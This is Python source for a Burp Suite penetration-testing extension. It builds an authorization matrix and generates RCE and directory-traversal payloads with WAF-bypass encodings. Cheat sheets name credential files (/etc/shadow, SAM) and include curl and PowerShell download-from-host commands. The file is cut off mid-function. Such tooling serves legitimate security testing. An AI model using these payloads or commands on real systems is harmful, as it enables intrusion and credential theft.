"""
Author: Volkan Dindar
"""
try:
    from burp import (IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory)
    from java.awt import (BorderLayout, FlowLayout, Color, Font, Dimension)
    from javax.swing import (JCheckBox, JMenuItem, JTextPane, JTable, JScrollPane, JProgressBar, SwingConstants, JComboBox, JButton, JTextField, JSplitPane, JPanel, JLabel, JRadioButton, ButtonGroup, JTabbedPane, BoxLayout)
    from javax.swing.border import EmptyBorder
    from javax.swing.table import (DefaultTableModel, TableCellRenderer, DefaultTableCellRenderer)
    import re, urlparse, urllib, urllib2, time, ssl
    from java.util import ArrayList
    from threading import Thread
    #from org.python.core.util import StringUtil
    from random import randrange
    

except ImportError:
    print "Failed to load dependencies."

VERSION = "0.01"
_colorful = True



class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):

        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Agartha {RCE|LFI|Auth}")
        print "Agartha is loading...v" + VERSION
        self._MainTabs = JTabbedPane()
        self._tabDictUI()
        self._tabAuthUI()
        self._MainTabs.addTab("Authorization Matrix", None, self._tabAuthSplitpane, None)
        self._MainTabs.addTab("Payload Generator", None, self._tabDictPanel, None)
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        self.tableMatrixReset(self)
        return


    def authMatrixThread(self, ev):
        if not self._cbAuthSessionHandling.isSelected():
            self.userNamesHttpReq= []
            self.userNamesHttpReq.append("")
            self.userNamesHttpReq = self.userNamesHttpReqD
        self._requestViewer.setMessage("", True)
        self._responseViewer.setMessage("", True)
        self._lblAuthNotification.text = ""
        self._tbAuthNewUser.setForeground (Color.black)
        self._btnAuthNewUserAdd.setEnabled(False)
        self._btnAuthRun.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthSessionHandling.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self.progressBar.setValue(0)
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self.tableMatrix.clearSelection()
        for x in range(0,self.tableMatrix.getRowCount()):
            for y in range(1,self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt("", x, y)
        
        i = 1000000 / ( self.tableMatrix.getRowCount() * (self.tableMatrix.getColumnCount()-1) )

        for x in range(0,self.tableMatrix.getRowCount()):
            for y in range(1,self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt(self.makeHttpCall(self.tableMatrix.getValueAt(x, 0), self.tableMatrix.getColumnName(y)), x, y)
                self.progressBar.setValue(self.progressBar.getValue() + i)
        
        self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0,self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)
        self.tableMatrix.repaint()
        self.tableMatrix.setAutoCreateRowSorter(True)
        self.tableMatrix.setSelectionForeground(Color.red)
        self._btnAuthNewUserAdd.setEnabled(True)
        self._btnAuthRun.setEnabled(True)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthSessionHandling.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.progressBar.setValue(1000000)
        self._lblAuthNotification.text = "RED: the url is in an user's list and returns same HTTP 2XX/Length.\t\tORANGE: the url is in an user's list and returns same HTTP 2XX with different length.\t\tYELLOW: the url is in an user's list and returns same HTTP 3XX/Length."
        return

    def makeHttpCall(self, urlAdd, userID):

        try:
            userID = self.userNames.index(userID)
            header = self.userNamesHttpReq[userID]
            if "\r\n" in header:
                #right click
                if "GET" in header[:3]:
                    header = self._helpers.bytesToString(self._callbacks.getHelpers().toggleRequestMethod((header)))
                header = "ABC "+ str(urlparse.urlparse(urlAdd).path) + " HTTP/1.1\r\n" + "\n".join(header.split("\n")[1:])
            else:
                #copy paste
                header = header.replace("\n", "\r\n")
                if "GET" in header[:3]:
                    header = self._helpers.bytesToString(self._callbacks.getHelpers().toggleRequestMethod((header)))
                header = ("ABC "+ str(urlparse.urlparse(urlAdd).path) + " HTTP/1.1\r\n" + "\n".join(header.split("\n")[1:]))
            header = self._callbacks.getHelpers().toggleRequestMethod((header))
            if self._cbAuthGETPOST.getSelectedIndex() == 1:
                header = self._callbacks.getHelpers().toggleRequestMethod((header))
    
            portNum = 80
            if urlparse.urlparse(urlAdd).port:
                portNum = urlparse.urlparse(urlAdd).port
            else:
                if urlparse.urlparse(urlAdd).scheme == "https":
                    portNum = 443
    
            try:
                #check for if service accessible                
                urllib2.urlopen(urlAdd, timeout=5).getcode()
            except Exception as e:
                if (re.findall(r'Host is down|timed out|Connection refused', str(e), re.IGNORECASE)):
                    self.httpReqRes[userID].append("")
                    return "Service not accessible!"
            
            _httpReqRes= self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(urlAdd).hostname, portNum, urlparse.urlparse(urlAdd).scheme), header)
            self.httpReqRes[userID].append(_httpReqRes)
            try:
                if userID > 0 and self._cbAuthSessionHandling.isSelected():
                    if "GET" in self._helpers.bytesToString(header)[:3]:    
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                    httpReqHeader= self._helpers.bytesToString(header).split('\r\n\r\n')[0]
                    httpReqData= self._helpers.bytesToString(header).split('\r\n\r\n')[1]
                    httpResHeader = str(self._helpers.analyzeResponse(_httpReqRes.getResponse()).getHeaders())
                    httpResBody = str(self._helpers.bytesToString(_httpReqRes.getResponse())[self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset():])
                    self.userNamesHttpReq[userID]= self.sessionHandler(httpReqHeader,httpReqData,httpResHeader,httpResBody)
            except Exception as e:
                pass
                #print str(e)
                #return "cookie handling error!"

            return "HTTP " + str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode() )+":"+str(len(self._helpers.bytesToString(_httpReqRes.getResponse())) - self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset())
        except:
            self.httpReqRes[userID].append("")
            return "Error"

    def sessionHandler(self, httpReqHeader, httpReqData, httpResHeader, httpResBody):
        httpReqHeader = "\n".join(httpReqHeader.split("\n"))        
        for line in httpReqHeader.splitlines()[1:]:
            if not any(re.findall(r'Accept:|Accept-|Cache|Connection:|Content-|Date|Expect|Forwarded|From|Host|If-Match|If-Modified-Since|If-None-Match|If-Range|If-Unmodified-Since|Max-Forwards|Origin|Pragma|Range|Referer|Upgrade|User-Agent|Warning|DNT:', line, re.IGNORECASE)):
                for d1 in line.split(':')[1:]:
                    for d2 in d1.split(';'):
                        param= str(d2.split('=')[0]).strip()
                        value= str(d2.split('=')[1]).strip()
                        if (re.findall(param, str(httpResHeader), re.IGNORECASE)):
                            for line2 in httpResHeader.splitlines():
                                for dd1 in line2.split(':')[1:]:
                                    for dd2 in dd1.split(';'):
                                        if param in dd2:
                                            httpReqHeader = httpReqHeader.replace(value, str(dd2.split('=')[1]))                                            
                                            break
    
        if httpReqData:
            httpResBody = str(httpResBody).replace('\'','').replace('\"','')
            for d1 in httpReqData.split('&'):
                param =  str(d1.split('=')[0]).strip()
                value =  str(d1.split('=')[1]).strip()
                if (re.findall(param, str(httpResBody), re.IGNORECASE)):
                    for line in httpResBody.splitlines():
                        if param in line:
                            for d2 in line.split(' '):
                                    if 'value' == str(d2.split('=')[0]):
                                        if not value == str(d2.split('=')[1]):
                                            httpReqData = httpReqData.replace(value, str(d2.split('=')[1]))                                        
                                            break
            return httpReqHeader+ "\r\n\r\n" + httpReqData
        return httpReqHeader

    def authAdduser(self, ev):
        
        if self.userCount==4:
            self._lblAuthNotification.text = "You can add only 4 users"
            return
        
        for line in self._tbAuthURL.getText().split('\n'):
            if not self.isURLValid(str(line)) or line == self._txtURLDefault:
                self._tbAuthURL.setForeground (Color.red)
                self._lblAuthNotification.text = "Please check url list!"
                self._lblAuthNotification.setForeground (Color.red)
                return
        self._tbAuthURL.setForeground (Color.black)

        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
            self._tbAuthHeader.setText(self._txtHeaderDefault)
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthHeader.setForeground (Color.black)

        if self._tbAuthNewUser.text in self.userNames:
            self._tbAuthNewUser.setForeground (Color.red)
            self._lblAuthNotification.text = "Please add another user name!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthNewUser.setForeground (Color.black)

        if self.userCount==0:
            #header for unauth user
            unauthHeader=self._tbAuthHeader.getText().split('\n')[0] + "\n" + self._tbAuthHeader.getText().split('\n')[1]
            for line in self._tbAuthHeader.getText().split('\n')[2:]:
                if not any(re.findall(r'cookie|token|auth', line, re.IGNORECASE)):
                    unauthHeader +=  "\n" + line
                if not line:
                    break
            self.userNamesHttpReq[0] = unauthHeader
            self.userNamesHttpReqD[0] = unauthHeader
        
        self.userCount = self.userCount + 1
        self.userNames.append(self._tbAuthNewUser.text)
        self.userNamesHttpReq.append(self._tbAuthHeader.getText())
        self.userNamesHttpReqD.append(self._tbAuthHeader.getText())
        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text)
        self.userNamesHttpUrls.append([])

        urlList=[]
        for x in range(0,self.tableMatrix.getRowCount()):
                urlList.append(str(self.tableMatrix.getValueAt(x, 0)))
        
        for line in self._tbAuthURL.getText().split('\n'):
            if line and not any(re.findall(r'(log|sign).*(off|out)', line, re.IGNORECASE)):
                self.userNamesHttpUrls[self.userCount].append(line)
                if line not in urlList:
                    self.tableMatrix_DM.addRow([line])
        
        self._tbAuthURL.setText("")
        self._btnAuthRun.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._lblAuthNotification.text = self._tbAuthNewUser.text + " added successfully!"
        self._lblAuthNotification.setForeground (Color.black)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthSessionHandling.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.tableMatrix.repaint()
        self.tableMatrix.setAutoCreateRowSorter(True)
        self.tableMatrix.setSelectionForeground(Color.red)
        self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0,self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)

        return

    def tableMatrixReset(self, ev):
        
        self.tableMatrix=[]        
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLS','NoAuth'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        self.userCount= 0
        self.userNames= []
        self.userNames.append("NoAuth")
        self.userNamesHttpReq= []
        self.userNamesHttpReq.append("")
        self.userNamesHttpReqD= []
        self.userNamesHttpReqD.append("")
        self.userNamesHttpUrls = [[]]
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self._requestViewer.setMessage("", True)
        self._responseViewer.setMessage("", True)
        self._lblAuthNotification.text = "Please add users to create an auth matrix"
        self._tbAuthNewUser.setForeground (Color.black)        
        self._txtHeaderDefault = "GET / HTTP/1.1\nHost: localhost\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: SessionID=......."
        self._tbAuthHeader.setText(self._txtHeaderDefault)
        self._txtURLDefault = "http://...."
        self._tbAuthURL.setText(self._txtURLDefault)
        self._txtUserDefault= "User1"
        self._tbAuthNewUser.text = self._txtUserDefault
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthSessionHandling.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self._btnAuthNewUserAdd.setEnabled(True)
        self.progressBar.setValue(0)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self._tabAuthSplitpaneHttp.setDividerLocation(0.5)
        self._tabAuthPanel.setDividerLocation(0.25)
        self._tabAuthSplitpane.setDividerLocation(0.7)        
        return

    def _cbAuthColoringFunc(self, ev):
        global _colorful
        if self._cbAuthColoring.isSelected():
            _colorful = True
        else:
            _colorful = False

        self.tableMatrix.repaint()
        return

    def _tabAuthUI(self):
        
        #panel top
        self._tbAuthNewUser = JTextField("", 15)
        self._tbAuthNewUser.setToolTipText("Please provide an username")
        self._btnAuthNewUserAdd = JButton("Add User", actionPerformed=self.authAdduser)
        self._btnAuthNewUserAdd.setPreferredSize(Dimension(90,27))
        self._btnAuthNewUserAdd.setToolTipText("Add User a specific user to create an auth matrix")
        self._btnAuthRun = JButton("RUN", actionPerformed=self.authMatrix)
        self._btnAuthRun.setPreferredSize(Dimension(150,27))
        self._btnAuthRun.setToolTipText("Start comparison")
        self._btnAuthReset = JButton("Reset", actionPerformed=self.tableMatrixReset)
        self._btnAuthReset.setPreferredSize(Dimension(90,27))
        self._btnAuthReset.setToolTipText("Clear all")
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)       
        self._tbAuthHeader = JTextPane()
        self._tbAuthHeader.setContentType("text")
        self._tbAuthHeader.setToolTipText("HTTP request belons to the user. You may copy and paste it from Repater/Proxy")
        self._tbAuthHeader.setEditable(True)
        self._tbAuthURL = JTextPane()
        self._tbAuthURL.setContentType("text")
        self._tbAuthURL.setToolTipText("What url links can be accessible by her/him. Please dont forget to remove logout links!")
        self._tbAuthURL.setEditable(True)
        self._cbAuthColoring= JCheckBox('ColorFul', True, itemStateChanged=self._cbAuthColoringFunc)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthColoring.setToolTipText("Colors may help to analysis easily")
        self._cbAuthGETPOST= JComboBox(('GET', 'POST'))
        self._cbAuthGETPOST.setSelectedIndex(0)
        self._cbAuthSessionHandling= JCheckBox('Session Handler*', False)
        self._cbAuthSessionHandling.setEnabled(False)
        self._cbAuthSessionHandling.setToolTipText("Experimental: Auto-updates cookies and paramaters, like CSRF tokens")

        #top panel
        _tabAuthPanel1 = JPanel(BorderLayout())
        _tabAuthPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthPanel1_A.setPreferredSize(Dimension(400,100))
        _tabAuthPanel1_A.add(self._btnAuthNewUserAdd)
        _tabAuthPanel1_A.add(self._tbAuthNewUser)
        _tabAuthPanel1_A.add(self._cbAuthGETPOST)
        _tabAuthPanel1_A.add(self._btnAuthReset)
        _tabAuthPanel1_A.add(self._btnAuthRun)
        _tabAuthPanel1_A.add(self._cbAuthColoring)
        _tabAuthPanel1_A.add(self._cbAuthSessionHandling)
        _tabAuthPanel1_B = JScrollPane(self._tbAuthHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthPanel1_C = JScrollPane(self._tbAuthURL, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        self._tabAuthSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthPanel1_B, _tabAuthPanel1_C)
        #self._tabAuthSplitpaneHttp.setPreferredSize(Dimension(800,100))
        _tabAuthPanel1.add(_tabAuthPanel1_A,BorderLayout.WEST)
        _tabAuthPanel1.add(self._tabAuthSplitpaneHttp,BorderLayout.CENTER)
        #panel top

        #panel center
        self._lblAuthNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrix=[]
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLS','NoAuth'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix.setAutoCreateRowSorter(True)
        self.tableMatrix.setSelectionForeground(Color.red)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.setOpaque(True)
        self.tableMatrix.setFillsViewportHeight(True)
        self.tableMatrix_SP = JScrollPane()
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        _tabAuthPanel2 = JPanel()
        #_tabAuthPanel2.setPreferredSize(Dimension(100, (self._tabAuthSplitpane.getPreferredSize().height) / 2))
        _tabAuthPanel2.setLayout(BoxLayout(_tabAuthPanel2, BoxLayout.Y_AXIS))
        _tabAuthPanel2.add(self._lblAuthNotification,BorderLayout.NORTH)
        _tabAuthPanel2.add(self.tableMatrix_SP,BorderLayout.NORTH)
        self.progressBar = JProgressBar()
        self.progressBar.setMaximum(1000000)
        self.progressBar.setMinimum(0)
        _tabAuthPanel2.add( self.progressBar, BorderLayout.SOUTH)
        #panel center
        #_tabAuthPanel = JPanel(BorderLayout())
        #_tabAuthPanel.add(_tabAuthPanel1,BorderLayout.NORTH)
        #_tabAuthPanel.add(_tabAuthPanel2,BorderLayout.CENTER)
        self._tabAuthPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthPanel.setBorder(EmptyBorder(20, 20, 20, 20))
        self._tabAuthPanel.setTopComponent(_tabAuthPanel1)
        self._tabAuthPanel.setBottomComponent(_tabAuthPanel2)

        #panel bottom
        _tabsReqRes = JTabbedPane()        
        self._requestViewer = self._callbacks.createMessageEditor(self, False)
        self._responseViewer = self._callbacks.createMessageEditor(self, False)
        _tabsReqRes.addTab("Request", self._requestViewer.getComponent())
        _tabsReqRes.addTab("Response", self._responseViewer.getComponent())
        #panel bottom

        self._tabAuthSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)        
        self._tabAuthSplitpane.setBorder(EmptyBorder(20, 20, 20, 20))        
        self._tabAuthSplitpane.setTopComponent(self._tabAuthPanel)
        self._tabAuthSplitpane.setBottomComponent(_tabsReqRes)


    def _tabDictUI(self):
        #top panel
        self._txtDefaultLFI="Example: 'etc/passwd', 'C:\\boot.ini'"
        self._txtDefaultRCE="Examples: $'sleep 1000', >'timeout 1000'"
        self._txtCheatSheetLFI=""
        self._txtCheatSheetLFI+="Directory Traversal Linux\t\t\tDirectory Traversal Windows\n"
        self._txtCheatSheetLFI+="\t/etc/passwd\t\t\t\tC:\\boot.ini\n"
        self._txtCheatSheetLFI+="\t/etc/profile\t\t\t\t\tC:\Windows\win.ini\n"
        self._txtCheatSheetLFI+="\t/proc/self/environ\t\t\t\tC:\windows\system.ini\n"
        self._txtCheatSheetLFI+="\t/proc/self/status\t\t\t\tC:\windows\system32\\notepad.exe\n"
        self._txtCheatSheetLFI+="\t/etc/hosts\t\t\t\t\tC:\Windows\System32\drivers\etc\hosts\n"
        self._txtCheatSheetLFI+="\t/etc/shadow\t\t\t\tC:\Windows\System32\Config\SAM\n"
        self._txtCheatSheetLFI+="\t/etc/group\t\t\t\t\tC:\users\public\desktop\desktop.ini\n"
        self._txtCheatSheetLFI+="\t/var/log/auth.log\t\t\t\tC:\windows\system32\eula.txt\n"
        self._txtCheatSheetLFI+="\t/var/log/auth.log\t\t\t\tC:\windows\system32\license.rtf\n"
        self._txtCheatSheetRCE=""
        self._txtCheatSheetRCE+="RCE Linux\t\t\t\t\tRCE Windows\n"
        self._txtCheatSheetRCE+="\tcat /etc/passwd\t\t\t\tcmd.exe?/c type file.txt\n"
        self._txtCheatSheetRCE+="\tuname -a\t\t\t\t\tsysteminfo\n"
        self._txtCheatSheetRCE+="\t/usr/bin/id\t\t\t\t\twhoami /priv\n"
        self._txtCheatSheetRCE+="\tping -c 10 X.X.X.X\t\t\t\tping -n 10 X.X.X.X\n"
        self._txtCheatSheetRCE+="\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\file.txt')\n"
        self._lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
        self._btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
        self._lblStatusLabel = JLabel(" ", SwingConstants.LEFT)
        self._txtDictParam = JTextField(self._txtDefaultLFI, 30)
        self._rbDictLFI = JRadioButton('DT/LFI', True, itemStateChanged=self.funcRBSelection);
        self._rbDictRCE = JRadioButton('RCE', itemStateChanged=self.funcRBSelection)
        self._rbDictXXE = JRadioButton('XXE', itemStateChanged=self.funcRBSelection)
        self._rbDictXSS = JRadioButton('XSS', itemStateChanged=self.funcRBSelection)
        self._rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
        self._rbDictFuzzer = JRadioButton('Fuzzer', itemStateChanged=self.funcRBSelection)
        _rbPanel = JPanel()
        _rbPanel.add(self._rbDictLFI)
        _rbPanel.add(self._rbDictRCE)
        #_rbPanel.add(self._rbDictCheatSheet)
        #_rbPanel.add(self._rbDictXXE)
        #_rbPanel.add(self._rbDictXSS)
        #_rbPanel.add(self._rbDictFuzzer)
        _rbGroup = ButtonGroup()
        _rbGroup.add(self._rbDictLFI)
        _rbGroup.add(self._rbDictRCE)
        _rbGroup.add(self._rbDictCheatSheet)
        _rbGroup.add(self._rbDictXXE)
        _rbGroup.add(self._rbDictXSS)
        _rbGroup.add(self._rbDictFuzzer)
        self._cbDictEncoding= JCheckBox('Waf Bypass', True)
        self._cbDictEquality= JCheckBox(')', False)
        self._cbDictDepth = JComboBox(list(range(0, 30)))
        self._cbDictDepth.setSelectedIndex(10)
        _cbDictDepthPanel = JPanel()
        _cbDictDepthPanel.add(self._cbDictDepth)
        
        _tabDictPanel_1 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabDictPanel_1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabDictPanel_1.add(self._txtDictParam, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._btnGenerateDict, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_rbPanel, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._lblDepth, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._cbDictEquality, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._cbDictEncoding, BorderLayout.PAGE_START)
        #top panel

        #center panel
        _tabDictPanel_2 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabDictPanel_2.add(self._lblStatusLabel)
        #center panel
        
        #bottom panel 
        self._tabDictResultDisplay = JTextPane()
        self._tabDictResultDisplay.setFont(self._tabDictResultDisplay.getFont().deriveFont(Font.PLAIN, 14))
        self._tabDictResultDisplay.setContentType("text")
        self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
        self._tabDictResultDisplay.setEditable(False)
        _tabDictPanel_3 = JPanel(BorderLayout(10, 10))
        _tabDictPanel_3.setBorder(EmptyBorder(10, 0, 0, 0))
        _tabDictPanel_3.add(JScrollPane(self._tabDictResultDisplay), BorderLayout.CENTER)
        #bottom panel 

        self._tabDictPanel = JPanel()
        self._tabDictPanel.setLayout(BoxLayout(self._tabDictPanel, BoxLayout.Y_AXIS))
        self._tabDictPanel.add(_tabDictPanel_1)
        self._tabDictPanel.add(_tabDictPanel_2)
        self._tabDictPanel.add(_tabDictPanel_3)

    def funcGeneratePayload(self, ev):
        self._lblStatusLabel.setForeground (Color.red)
        if not self.isValid():
            self._lblStatusLabel.setText("input is not valid. ")
            if self._rbDictLFI.isSelected():
                self._lblStatusLabel.setText("File "+ self._lblStatusLabel.text + self._txtDefaultLFI)
                self._txtDictParam.setText("etc/passwd")
            elif self._rbDictRCE.isSelected():
                self._lblStatusLabel.setText("Remote code " +self._lblStatusLabel.text + self._txtDefaultRCE)
                self._txtDictParam.setText("sleep 1000")
            return 
        self._lblStatusLabel.setForeground (Color.black)
        self._txtDictParam.text = self._txtDictParam.text.strip()
        self._tabDictResultDisplay.setText("")
        self._lblStatusLabel.setText('')
        if self._rbDictRCE.isSelected():
            self.funcRCE(self)
        if self._rbDictLFI.isSelected():
            self.funcLFI(self)
        return
       
    def isValid(self):
        # check if any special chars
        regex = re.compile('[@,\'\"!#$%^&*<>\|}{]')
        if(regex.search(self._txtDictParam.text) == None):
            #clear
            return True
        else:
            #special char
            return False

    def funcRBSelection(self, ev):
        self._lblStatusLabel.setText("")
        self._lblDepth.setVisible(False)
        self._cbDictEncoding.setVisible(False)
        self._cbDictEquality.setVisible(False)
        self._cbDictDepth.setVisible(False)
        if self._rbDictLFI.isSelected():
            self._txtDictParam.setText(self._txtDefaultLFI)
            self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
            self._lblDepth.setVisible(True)
            self._cbDictEncoding.setVisible(True)
            self._cbDictEquality.setVisible(True)
            self._cbDictDepth.setVisible(True)
        elif self._rbDictRCE.isSelected():
            self._txtDictParam.setText(self._txtDefaultRCE)
            self._tabDictResultDisplay.setText(self._txtCheatSheetRCE)
        elif self._rbDictCheatSheet.isSelected():
            self._tabDictResultDisplay.setText(self._txtCheatSheet)
            self._lblStatusLabel.setText('')
        return

    def funcRCE(self, ev):
        listem = []
        delimeters = ["", "'", "\\'", "\"", "\\\"", "&", "&&", "|", "||", ";", "`", "^", "%0a", "0x0a", "%0d", "0x0d", "%1a", "0x1a", "%00", "0x00", "\\n", "\\\\n"]
        for delimeter in delimeters:
            delimeter.strip()
            listem.append(delimeter + self._txtDictParam.text + "\n")
            listem.append(delimeter + self._txtDictParam.text + delimeter + "\n")
       
        delimeters = ["", "'", "\\'", "\"", "`", "\\\""]
        delimeters2 = ["", "&", "&&", "|", "||", ";", "%0a", "0x0a", "%0d", "0x0d", "%1a", "0x1a", "\\n", "%00", "0x00", "\\\\n"]
        delimeters3 = ["", "'", "\\'", "\"", "`", "\\\""]
        for delimeter in delimeters:
            delimeter.strip()
            for delimeter2 in delimeters2:
                delimeter2.strip()
                listem.append(delimeter2 + delimeter + self._txtDictParam.text + delimeter + "\n")
                listem.append(delimeter2 + delimeter + self._txtDictParam.text + delimeter + delimeter2 + "\n")
                listem.append(delimeter + delimeter2 + self._txtDictParam.text + "\n")
                listem.append(delimeter + delimeter2 + self._txtDictParam.text + delimeter2 + "\n")
                listem.append(delimeter + delimeter2 + self._txtDictParam.text + delimeter2 + delimeter + "\n")
                listem.append(delimeter + delimeter2 + delimeter + self._txtDictParam.text + delimeter + "\n")
                listem.append(delimeter + delimeter2 + delimeter + self._txtDictParam.text + delimeter + delimeter2 + "\n")
                listem.append(delimeter + delimeter2 + delimeter + self._txtDictParam.text + delimeter + delimeter2 + delimeter + "\n")
                for delimeter3 in delimeters3:
                    delimeter3.strip()
                    listem.append(delimeter3 + delimeter + self._txtDictParam.text + delimeter + "\n")
                    listem.append(delimeter3 + delimeter + self._txtDictParam.text + delimeter + delimeter3 + "\n")
                    listem.append(delimeter3 + delimeter2 + delimeter + self._txtDictParam.text + delimeter + delimeter2 + "\n")
                    listem.append(delimeter3 + delimeter2 + delimeter + self._txtDictParam.text + delimeter + delimeter2 + delimeter3 + "\n")

        listem = list(set(listem))
        listem.sort()
        self._tabDictResultDisplay.setText(''.join(map(str, listem)))
        self._lblStatusLabel.setText('Remote code dictionary: "' + self._txtDictParam.text + '", with '+ str(len(listem)) + ' result.')
        return

    def funcLFI(self, ev):
        listem = []
        dept= int(self._cbDictDepth.getSelectedItem())
        counter = 0
        delimeter= "../"
        delimeter2= "..\\"

        if self._txtDictParam.text.startswith('/') or self._txtDictParam.text.startswith('\\'):
            self._txtDictParam.text = self._txtDictParam.text[1:]
            
        if self._cbDictEquality.isSelected():
            counter = dept
            
        while counter <= dept:
            _resultTxt = ""
            _resultTxt2 = ""
            i=1
            while i <= counter:
                _resultTxt += delimeter
                _resultTxt2 += delimeter2
                i = i + 1
                
            listem.append(_resultTxt + self._txtDictParam.text + "\n")
            
            if self._cbDictEncoding.isSelected():
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "..//")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "//")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "...")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "....")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "....//")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "..../\\")+"\n")

                listem.append((_resultTxt).replace("/", "%uEFC8") + self._txtDictParam.text +"\n")
                listem.append((_resultTxt).replace("/", "%uF025") + self._txtDictParam.text +"\n")
            
                listem.append(_resultTxt + self._txtDictParam.text + "%00index.html\n")
                listem.append(_resultTxt + self._txtDictParam.text + "%00\n")
                listem.append(_resultTxt + self._txtDictParam.text + ";index.html\n")
                listem.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")

                listem.append((_resultTxt).replace("/", "%2f")+ self._txtDictParam.text +"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%2f")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%2e%2e")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%2e%2e%2f")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%2e%2e").replace("/", "%2f")+"\n")
                
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "..\\/")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "\\/")+"\n")
                

                listem.append((_resultTxt).replace("/", "%252f")+ self._txtDictParam.text +"\n")
